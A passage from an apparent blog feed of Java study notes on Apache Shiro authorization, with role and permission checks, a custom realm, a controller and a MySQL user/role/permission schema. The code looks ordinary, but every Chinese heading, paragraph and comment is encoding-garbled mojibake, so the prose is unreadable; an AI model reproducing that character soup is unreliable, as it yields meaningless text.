getRedisTemplate()&#123;</span><br><span class="line">        RedisTemplate redisTemplate = (RedisTemplate) ApplicationContextUtils.getBean(<span class="string">"redisTemplate"</span>);</span><br><span class="line">        redisTemplate.setKeySerializer(new StringRedisSerializer());</span><br><span class="line">        redisTemplate.setHashKeySerializer(new StringRedisSerializer());</span><br><span class="line">        <span class="keyword">return</span> redisTemplate;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;ç¼“å­˜&quot;&gt;&lt;a href=&quot;#ç¼“å­˜&quot; class=&quot;headerlink&quot; title=&quot;ç¼“å­˜&quot;&gt;&lt;/a&gt;ç¼“å­˜&lt;/h1&gt;&lt;p&gt;é¡µé¢ä¸­æƒé™çš„æ•°æ®æ¯æ¬¡è®¿é—®éƒ½ä¼šä¸æ•°æ®åº“è¿›è¡Œä¸€æ¬¡äº¤äº’ è¿™æ ·å°±å¯¼è‡´ç”¨æˆ·æ•°é‡å¤šçš„æ—¶å€™ è®¿é—®é‡å¤§çš„æ—¶å€™  å°±ä¼šå¯¼è‡´æ•°æ®åº“å‹åŠ›è¿‡å¤§&lt;/p&gt;
&lt;p&gt;æ‰€ä»¥ä¸º
      
    
    </summary>
    
    
      <category term="æ—¥å¸¸å­¦ä¹ " scheme="http://yoursite.com/categories/%E6%97%A5%E5%B8%B8%E5%AD%A6%E4%B9%A0/"/>
    
      <category term="JavaWeb" scheme="http://yoursite.com/categories/%E6%97%A5%E5%B8%B8%E5%AD%A6%E4%B9%A0/JavaWeb/"/>
    
    
      <category term="å¼€å‘" scheme="http://yoursite.com/tags/%E5%BC%80%E5%8F%91/"/>
    
  </entry>
  
  <entry>
    <title>Shiro-2020/12/7-æˆæƒæ•°æ®æŒä¹…åŒ–</title>
    <link href="http://yoursite.com/2020/12/07/Shiro-2020-12-7-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/"/>
    <id>http://yoursite.com/2020/12/07/Shiro-2020-12-7-%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/</id>
    <published>2020-12-07T05:11:00.000Z</published>
    <updated>2021-02-21T04:59:35.458Z</updated>
    
    <content type="html"><![CDATA[<h1 id="æˆæƒ"><a href="#æˆæƒ" class="headerlink" title="æˆæƒ"></a>æˆæƒ</h1><h2 id="æˆæƒæ–¹å¼"><a href="#æˆæƒæ–¹å¼" class="headerlink" title="æˆæƒæ–¹å¼"></a>æˆæƒæ–¹å¼</h2><ul><li><p>ç¼–ç¨‹å¼</p><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Subject subject = <span class="module-access"><span class="module"><span class="identifier">SecurityUtils</span>.</span></span>get<span class="constructor">Subject()</span>;</span><br><span class="line"><span class="keyword">if</span>(subject.has<span class="constructor">Role(<span class="string">"admin"</span>)</span>)&#123;</span><br><span class="line"><span class="comment">//æœ‰æƒé™</span></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="comment">//æ— æƒé™</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>æ³¨è§£å¼</p><figure class="highlight aspectj"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequiresRoles</span>(<span class="string">"admin"</span>)</span><br><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">void</span> <span class="title">hello</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="comment">//æœ‰æƒé™</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>æ ‡ç­¾å¼</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">JSP/GSP æ ‡ç­¾ï¼šåœ¨JSP/GSP é¡µé¢é€šè¿‡ç›¸åº”çš„æ ‡ç­¾å®Œæˆï¼š</span><br><span class="line"><span class="tag">&lt;<span class="name">shiro:hasRole</span> <span class="attr">name</span>=<span class="string">"admin"</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- æœ‰æƒé™ --&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">shiro:hasRole</span>&gt;</span></span><br><span class="line">æ³¨æ„ï¼šThymeleaf ä¸­ä½¿ç”¨shiroéœ€è¦é¢å¤–é›†æˆ!</span><br></pre></td></tr></table></figure></li></ul><h2 id="æˆæƒå®ç°"><a href="#æˆæƒå®ç°" class="headerlink" title="æˆæƒå®ç°"></a>æˆæƒå®ç°</h2><p>é¦–å…ˆæ¨¡æ‹Ÿä¸€ä¸‹å‡æ•°æ®ï¼Œä¸æ“ä½œæ•°æ®åº“</p><p>åœ¨CustomerRealmä¸‹æœ‰ä¸€ä¸ªdoGetAuthorizationInfoæ–¹æ³•</p><p>è¿™é‡Œå°±è´Ÿè´£æˆæƒçš„æ“ä½œ</p><p>ç°åœ¨å°±å‡è®¾æ™®é€šç”¨æˆ·èƒ½çœ‹åˆ°ç”¨æˆ·ç®¡ç†  adminå¯ä»¥çœ‹åˆ°æ‰€æœ‰çš„èœå•</p><p>æ ‡ç­¾å¼ï¼š<br>shiroæ ‡ç­¾å¼•å…¥<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;%@taglib <span class="attribute">prefix</span>=<span class="string">"shiro"</span> <span class="attribute">uri</span>=<span class="string">"http://shiro.apache.org/tags"</span>%&gt;</span><br></pre></td></tr></table></figure></p><p>åœ¨index.jspæ·»åŠ ä¸Šshiroæ ‡ç­¾<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">shiro:hasAnyRoles</span> <span class="attr">name</span>=<span class="string">"user,admin"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span>ç”¨æˆ·ç®¡ç†<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">shiro:hasPermission</span> <span class="attr">name</span>=<span class="string">"user:add:*"</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span>æ·»åŠ <span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">shiro:hasPermission</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">shiro:hasPermission</span> <span class="attr">name</span>=<span class="string">"user:delete:*"</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span>åˆ é™¤<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">shiro:hasPermission</span>&gt;</span> </span><br><span class="line">                <span class="tag">&lt;<span class="name">shiro:hasPermission</span> <span class="attr">name</span>=<span class="string">"user:update:*"</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span>ä¿®æ”¹<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">shiro:hasPermission</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">shiro:hasPermission</span> <span class="attr">name</span>=<span class="string">"user:find:*"</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span>æŸ¥è¯¢<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">shiro:hasPermission</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">shiro:hasAnyRoles</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">shiro:hasRole</span> <span class="attr">name</span>=<span class="string">"admin"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span>å•†å“ç®¡ç†<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span>è®¢å•ç®¡ç†<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">""</span>&gt;</span>ç‰©æµç®¡ç†<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">shiro:hasRole</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>CustomerRealmä¸­å†™ä¸Šå¯¹åº”çš„æˆæƒæ–¹æ³•<br><figure class="highlight reasonml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">@Override</span><br><span class="line">protected AuthorizationInfo <span class="keyword">do</span><span class="constructor">GetAuthorizationInfo(PrincipalCollection <span class="params">principalCollection</span>)</span> &#123;</span><br><span class="line">    <span class="comment">//è·å–èº«ä»½ä¿¡æ¯</span></span><br><span class="line">    String primaryPrincipal = (String) principalCollection.get<span class="constructor">PrimaryPrincipal()</span>;</span><br><span class="line">    <span class="module-access"><span class="module"><span class="identifier">System</span>.</span></span>out.println(<span class="string">"è°ƒç”¨æˆæƒéªŒè¯ï¼š"</span>+primaryPrincipal);</span><br><span class="line">    <span class="comment">//æ ¹æ®ä¸»èº«ä»½ä¿¡æ¯è·å–è§’è‰²å’Œæƒé™ä¿¡æ¯</span></span><br><span class="line">    <span class="keyword">if</span>(<span class="string">"xiaochen"</span>.equals(primaryPrincipal))&#123;</span><br><span class="line">        SimpleAuthorizationInfo simpleAuthorizationInfo = <span class="keyword">new</span> <span class="constructor">SimpleAuthorizationInfo()</span>;</span><br><span class="line"></span><br><span class="line">        simpleAuthorizationInfo.add<span class="constructor">Role(<span class="string">"user"</span>)</span>;</span><br><span class="line"></span><br><span class="line">        simpleAuthorizationInfo.add<span class="constructor">StringPermission(<span class="string">"user:find:*"</span>)</span>;</span><br><span class="line">        simpleAuthorizationInfo.add<span class="constructor">StringPermission(<span class="string">"user:update:*"</span>)</span>;</span><br><span class="line"></span><br><span class="line">        return simpleAuthorizationInfo;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    return null;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>ç°åœ¨xiaochenè¿™ä¸ªè´¦å·å°±æ˜¯ä¸ªæ™®é€šç”¨æˆ· å¯ä»¥çœ‹åˆ°ç”¨æˆ·ç®¡ç†  å¹¶ä¸”å¯¹æ‰€æœ‰æ–‡ä»¶éƒ½å…·æœ‰ä¿®æ”¹å’ŒæŸ¥æ‰¾çš„æ“ä½œæƒåŠ› ä»–åªèƒ½çœ‹è§ä¿®æ”¹å’ŒæŸ¥æ‰¾çš„åŠŸèƒ½  çœ‹åˆ°ä¸æ·»åŠ åˆ é™¤åŠŸèƒ½</p><p>è¿™å°±å®Œæˆäº†é€šè¿‡æ ‡ç­¾çš„æ–¹å¼å®Œæˆäº†æˆæƒçš„æ“ä½œï¼Œå®é™…å¼€å‘ä¸­ä¸€èˆ¬ä¸ä¼šä½¿ç”¨è¿™ç§æ–¹å¼å»å®Œæˆæˆæƒæ“ä½œ</p><p>ä»£ç å¼ï¼š<br>åˆ›å»ºä¸€ä¸ªOrderController<br><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.ceit.springboot_jsp_shiro.controller;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.SecurityUtils;</span><br><span class="line"><span class="keyword">import</span> org.apache.shiro.subject.Subject;</span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Controller;</span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.<span class="keyword">annotation</span>.RequestMapping;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Controller</span></span><br><span class="line"><span class="meta">@RequestMapping(<span class="meta-string">"order"</span>)</span></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">OrderController</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@RequestMapping(<span class="meta-string">"save"</span>)</span></span><br><span class="line">    <span class="keyword">public</span> String save()&#123;</span><br><span class="line">        <span class="comment">//è·å–ä¸»ä½“å¯¹è±¡</span></span><br><span class="line">        Subject subject = SecurityUtils.getSubject();</span><br><span class="line">        <span class="comment">//ä»£ç æ–¹å¼</span></span><br><span class="line">        <span class="keyword">if</span> (subject.hasRole(<span class="string">"admin"</span>)) &#123;</span><br><span class="line">            System.<span class="keyword">out</span>.println(<span class="string">"ä¿å­˜è®¢å•"</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            System.<span class="keyword">out</span>.println(<span class="string">"æ— æƒè®¿é—®"</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//åŸºäºæƒé™å­—ç¬¦ä¸²</span></span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> <span class="string">"redirect:/index.jsp"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br>è¿™æ˜¯ä¸ªç®€å•çš„æ¼”ç¤º  å¦‚æœxiaochenæ˜¯admin  é‚£å°±æ§åˆ¶å°è¾“å‡ºä¿å­˜è®¢å•</p><p>æ³¨è§£å¼ï¼š<br>å°†ä¸Šé¢çš„ä»£ç æ·»åŠ ä¸Šä¸€ä¸ªæ³¨è§£å³å¯<br><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">@RequestMapping</span>(<span class="string">"save"</span>)</span><br><span class="line"><span class="variable">@RequiresRoles</span>(<span class="string">"admin"</span>)<span class="comment">//ç”¨æ¥åˆ¤æ–­è§’è‰²</span></span><br></pre></td></tr></table></figure><br>å¦‚æœè¦åˆ¤æ–­å¤šä¸ªè§’è‰²<br><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequiresRoles(value=&#123;<span class="meta-string">"admin"</span>,<span class="meta-string">"user"</span>&#125;)</span><span class="comment">//ç”¨æ¥åˆ¤æ–­è§’è‰²  åŒæ—¶å…·æœ‰adminå’Œuserèº«ä»½</span></span><br></pre></td></tr></table></figure></p><p>è¿˜æœ‰åˆ¤æ–­æƒé™å­—ç¬¦ä¸²çš„æ³¨è§£<br><figure class="highlight kotlin"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@RequiresPermissions(<span class="meta-string">"user:update:01"</span>)</span> <span class="comment">//ç”¨æ¥åˆ¤æ–­æƒé™å­—ç¬¦ä¸²</span></span><br></pre></td></tr></table></figure></p><h2 id="æˆæƒæ•°æ®æŒä¹…åŒ–"><a href="#æˆæƒæ•°æ®æŒä¹…åŒ–" class="headerlink" title="æˆæƒæ•°æ®æŒä¹…åŒ–"></a>æˆæƒæ•°æ®æŒä¹…åŒ–</h2><h3 id="è§’è‰²ä¿¡æ¯è·å–"><a href="#è§’è‰²ä¿¡æ¯è·å–" class="headerlink" title="è§’è‰²ä¿¡æ¯è·å–"></a>è§’è‰²ä¿¡æ¯è·å–</h3><p>é¦–å…ˆè¦å®Œæˆé€šè¿‡æ•°æ®åº“æˆæƒçš„æ“ä½œï¼Œè‡ªç„¶æ˜¯å…ˆè¦å»è®¾è®¡ä¸€ä¸‹åº“è¡¨äº†</p><p>è¿™é‡Œå°±ä¸è®²è¿‡ç¨‹äº† ç›´æ¥è´´sqlæ–‡ä»¶<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">Navicat MySQL Data Transfer</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Source Server         : localhost</span></span><br><span class="line"><span class="comment">Source Server Version : 80020</span></span><br><span class="line"><span class="comment">Source Host           : localhost:3306</span></span><br><span class="line"><span class="comment">Source Database       : shiro_spring</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Target Server Type    : MYSQL</span></span><br><span class="line"><span class="comment">Target Server Version : 80020</span></span><br><span class="line"><span class="comment">File Encoding         : 65001</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Date: 2020-12-07 17:40:29</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">SET</span> FOREIGN_KEY_CHECKS=<span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- ----------------------------</span></span><br><span class="line"><span class="comment">-- Table structure for t_pers</span></span><br><span class="line"><span class="comment">-- ----------------------------</span></span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">TABLE</span> <span class="keyword">IF</span> <span class="keyword">EXISTS</span> <span class="string">`t_pers`</span>;</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="string">`t_pers`</span> (</span><br><span class="line">  <span class="string">`id`</span> <span class="built_in">int</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> AUTO_INCREMENT,</span><br><span class="line">  <span class="string">`name`</span> <span class="built_in">varchar</span>(<span class="number">80</span>) <span class="built_in">CHARACTER</span> <span class="keyword">SET</span> utf8 <span class="keyword">COLLATE</span> utf8_general_ci <span class="keyword">DEFAULT</span> <span class="literal">NULL</span>,</span><br><span class="line">  <span class="string">`url`</span> <span class="built_in">varchar</span>(<span class="number">255</span>) <span class="keyword">DEFAULT</span> <span class="literal">NULL</span>,</span><br><span class="line">  PRIMARY <span class="keyword">KEY</span> (<span class="string">`id`</span>)</span><br><span class="line">) <span class="keyword">ENGINE</span>=<span class="keyword">InnoDB</span> <span class="keyword">DEFAULT</span> <span class="keyword">CHARSET</span>=utf8;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- ----------------------------</span></span><br><span class="line"><span class="comment">-- Table structure for t_role</span></span><br><span class="line"><span class="comment">-- ----------------------------</span></span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">TABLE</span> <span class="keyword">IF</span> <span class="keyword">EXISTS</span> <span class="string">`t_role`</span>;</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="string">`t_role`</span> (</span><br><span class="line">  <span class="string">`id`</span> <span class="built_in">int</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> AUTO_INCREMENT,</span><br><span class="line">  <span class="string">`name`</span> <span class="built_in">varchar</span>(<span class="number">60</span>) <span class="keyword">DEFAULT</span> <span class="literal">NULL</span>,</span><br><span class="line">  PRIMARY <span class="keyword">KEY</span> (<span class="string">`id`</span>)</span><br><span class="line">) <span class="keyword">ENGINE</span>=<span class="keyword">InnoDB</span> <span class="keyword">DEFAULT</span> <span class="keyword">CHARSET</span>=utf8;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- ----------------------------</span></span><br><span class="line"><span class="comment">-- Table structure for t_role_perms</span></span><br><span class="line"><span class="comment">-- ----------------------------</span></span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">TABLE</span> <span class="keyword">IF</span> <span class="keyword">EXISTS</span> <span class="string">`t_role_perms`</span>;</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="string">`t_role_perms`</span> (</span><br><span class="line">  <span class="string">`id`</span> <span class="built_in">int</span> <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">  <span class="string">`roleid`</span> <span class="built_in">int</span> <span class="keyword">DEFAULT</span> <span class="literal">NULL</span>,</span><br><span class="line">  <span class="string">`permsid`</span> <span class="built_in">int</span> <span class="keyword">DEFAULT</span> <span class="literal">NULL</span>,</span><br><span class="line">  PRIMARY <span class="keyword">KEY</span> (<span class="string">`id`</span>)</span><br><span class="line">) <span class="keyword">ENGINE</span>=<span class="keyword">InnoDB</span> <span class="keyword">DEFAULT</span> <span class="keyword">CHARSET</span>=utf8;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- ----------------------------</span></span><br><span class="line"><span class="comment">-- Table structure for t_user</span></span><br><span class="line"><span class="comment">-- ----------------------------</span></span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">TABLE</span> <span class="keyword">IF</span> <span class="keyword">EXISTS</span> <span class="string">`t_user`</span>;</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="string">`t_user`</span> (</span><br><span class="line">  <span class="string">`id`</span> <span class="built_in">int</span> <span class="keyword">NOT</span> <span class="literal">NULL</span> AUTO_INCREMENT,</span><br><span class="line">  <span class="string">`username`</span> <span class="built_in">varchar</span>(<span class="number">255</span>) <span class="keyword">DEFAULT</span> <span class="literal">NULL</span>,</span><br><span class="line">  <span class="string">`password`</span> <span class="built_in">varchar</span>(<span class="number">255</span>) <span class="keyword">DEFAULT</span> <span class="literal">NULL</span>,</span><br><span class="line">  <span class="string">`salt`</span> <span class="built_in">varchar</span>(<span class="number">255</span>) <span class="keyword">DEFAULT</span> <span class="literal">NULL</span>,</span><br><span class="line">  PRIMARY <span class="keyword">KEY</span> (<span class="string">`id`</span>)</span><br><span class="line">) <span class="keyword">ENGINE</span>=<span class="keyword">InnoDB</span> AUTO_INCREMENT=<span class="number">5</span> <span class="keyword">DEFAULT</span> <span class="keyword">CHARSET</span>=utf8;</span><br><span class="line"></span><br><span class="line"><span class="comment">-- ----------------------------</span></span><br><span class="line"><span class="comment">-- Table structure for t_user_role</span></span><br><span class="line"><span class="comment">-- ----------------------------</span></span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">TABLE</span> <span class="keyword">IF</span> <span class="keyword">EXISTS</span> <span class="string">`t_user_role`</span>;</span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">TABLE</span> <span class="string">`t_user_role`</span> (</span><br><span class="line">  <span class="string">`id`</span> <span class="built_in">int</span> <span class="keyword">NOT</span> <span class="literal">NULL</span>,</span><br><span class="line">  <span class="string">`userid`</span> <span class="built_in">int</span> <span class="keyword">DEFAULT</span> <span class="literal">NULL</span>,</span><br><span class="line">  <span class="string">`roleid`</span> <span class="built_in">int</span> <span class="keyword">DEFAULT</span> <span class="literal">NULL</span>,</span><br><span class="line">  PRIMARY <span class="keyword">KEY</span> (<span class="string">`id`</span>)</span><br><span class="line">) <span class="keyword">ENGINE</span>=<span class="keyword">InnoDB</span> <span class="keyword">DEFAULT</span> <span class="keyword">CHARSET</span>=utf8;</span><br></pre></td></tr></table></figure></p><p>t_roleè¡¨å†…å®¹:</p><div class="table-container"><table><thead><tr><th>id</th><th>name</th></tr></thead><tbody><tr><td>1</td><td>admin</td></tr><tr><td>2</td><td>user</td></tr><tr><td>3</td><td>product</td></tr></tbody></table></div><p>t_user_roleè¡¨å†…å®¹ï¼š</p><div class="table-container"><table><thead><tr><th>id</th><th>userid</th><th>roleid</th></tr></thead><tbody><tr><td>1</td><td>1</td><td>1</td></tr><tr><td>2</td><td>2</td><td>2</td></tr><tr><td>3</td><td>2</td><td>3</td></tr></tbody></table></div><p><img src="/img/JavaWeb/12-7å­¦ä¹ æ—¥è®°/0.png" alt="avatar"></p><p>æ¥ç€å°±æ˜¯æ„å»ºå®ä½“ç±»Perms å’Œ Role</p><p>Role:<br><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">package com.ceit.springboot_jsp_shiro.entity;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> lombok.AllArgsConstructor;</span><br><span class="line"><span class="keyword">import</span> lombok.Data;</span><br><span class="line"><span class="keyword">import</span> lombok.NoArgsConstructor;</span><br><span class="line"><span class="keyword">import</span> lombok.experimental.Accessors;</span><br><span class="line"></span><br><span class="line">@Data</span><br><span class="line">@Accessors(chain = <span class="literal">true</span>)</span><br><span class="line">@AllArgsConstructor</span><br><span class="line">@NoArgsConstructor</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Role</span> &#123;</span></span><br><span class="line">    <span class="keyword">private</span> <span 